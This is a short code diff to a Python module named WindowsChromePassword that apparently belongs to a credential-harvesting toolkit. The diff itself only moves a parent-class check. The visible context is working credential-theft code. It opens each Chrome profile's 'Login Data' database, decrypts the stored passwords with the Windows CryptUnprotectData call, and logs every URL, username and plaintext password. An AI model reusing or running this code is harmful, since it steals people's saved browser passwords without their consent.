@@ -27,6 +27,9 @@ class WindowsChromePassword(ChromeModule):
 		return super().has()
 
 	def execute(self) -> bool:
+		if not super().execute():
+			return False
+
 		for profile in self.get_profiles():
 			password_path = profile + '\\Login Data'
 			if os.path.isfile(password_path):
@@ -42,4 +45,4 @@ class WindowsChromePassword(ChromeModule):
 				for url, username, password in cursor.fetchall():
 					self.log(url + ',' + username + ',' + (win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]).decode('utf-8'))
 
-		return super().execute()
+		return True
